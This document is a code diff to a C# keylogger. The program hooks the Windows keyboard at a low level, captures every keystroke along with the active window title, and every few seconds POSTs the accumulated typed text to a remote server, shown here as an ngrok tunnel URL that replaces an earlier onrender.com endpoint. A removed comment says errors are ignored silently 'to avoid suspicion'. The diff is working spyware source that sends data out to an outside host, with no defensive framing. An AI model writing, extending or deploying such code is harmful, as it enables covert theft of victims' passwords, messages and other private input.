@@ -13,25 +13,23 @@ namespace KeyLogger {
   public static class Program {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
-    
-    // Add Window Title Detection
-    private const int GW_HWNDNEXT = 2;
-    private const int WM_GETTEXT = 0x000D;
     private static string currentWord = "";
     private static string currentWindowTitle = "";
+    private static string fullTextBuffer = "";
+    private static string lastSentText = "";
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
-    
+
     private static System.Threading.Timer sendTimer;
     private static object lockObject = new object();
-    
+
     public static void Main() {
       hookId = SetHook(hookProc);
-      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 2000, 3000); // start after 2s, send every 3s
+      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 2000, 3000); // every 3s
       Application.Run();
       UnhookWindowsHookEx(hookId);
     }
-    
+
     private static IntPtr SetHook(HookProc hookProc) {
       IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
       return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
@@ -42,8 +40,8 @@ namespace KeyLogger {
     private static void SendWordToServer(string word) {
       ThreadPool.QueueUserWorkItem(state => {
         try {
-          string jsonBody = "{ \"words\": \"" + word + "\", \"window_title\": \"" + currentWindowTitle + "\" }";
-          string url = "https://xenv1.onrender.com/captures";
+          string jsonBody = "{ \"words\": \"" + word.Replace("\"", "\\\"") + "\", \"window_title\": \"" + currentWindowTitle.Replace("\"", "\\\"") + "\" }";
+          string url = "https://8140-197-231-201-192.ngrok-free.app/captures";
           var webRequest = WebRequest.Create(url);
           webRequest.Method = "POST";
           byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
@@ -57,16 +55,16 @@ namespace KeyLogger {
           var response = webRequest.GetResponse();
           response.Close();
         } catch {
-          // Silently ignore to avoid suspicion
+          // Fail silently
         }
       });
     }
 
     private static void SendWordsToServer(object state) {
       lock (lockObject) {
-        if (!string.IsNullOrEmpty(currentWord)) {
-          SendWordToServer(currentWord);
-          currentWord = "";
+        if (!string.IsNullOrWhiteSpace(fullTextBuffer) && fullTextBuffer != lastSentText) {
+          SendWordToServer(fullTextBuffer);
+          lastSentText = fullTextBuffer;
         }
       }
     }
@@ -82,8 +80,6 @@ namespace KeyLogger {
         }
 
         string keyText = "";
-
-        // Detect active window title
         currentWindowTitle = GetActiveWindowTitle();
 
         Dictionary<int, string> normalSymbols = new Dictionary<int, string> {
@@ -116,10 +112,11 @@ namespace KeyLogger {
           keyText = " ";
         }
         else if (vkCode == 0x08) {
-          if (currentWord.Length > 0) {
-            lock (lockObject) {
+          lock (lockObject) {
+            if (currentWord.Length > 0)
               currentWord = currentWord.Substring(0, currentWord.Length - 1);
-            }
+            if (fullTextBuffer.Length > 0)
+              fullTextBuffer = fullTextBuffer.Substring(0, fullTextBuffer.Length - 1);
           }
         }
         else if (isShift && shiftSymbols.ContainsKey(vkCode)) {
@@ -132,6 +129,7 @@ namespace KeyLogger {
         if (!string.IsNullOrEmpty(keyText)) {
           lock (lockObject) {
             currentWord += keyText;
+            fullTextBuffer += keyText;
           }
         }
       }
